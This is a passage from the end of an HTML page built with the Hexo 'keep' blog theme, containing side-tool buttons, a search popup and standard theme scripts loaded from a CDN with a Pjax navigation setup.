                <i class="fas fa-list"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>




    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>


<div class="post-scripts pjax">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
        
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
        
    
</div>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
<script>
    window.addEventListener('DOMContentLoaded', () => {
        window.pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            KEEP.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            KEEP.utils.pjaxProgressBarEnd();
            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            KEEP.refresh();
        });
    });
</script>



</body>
</html>
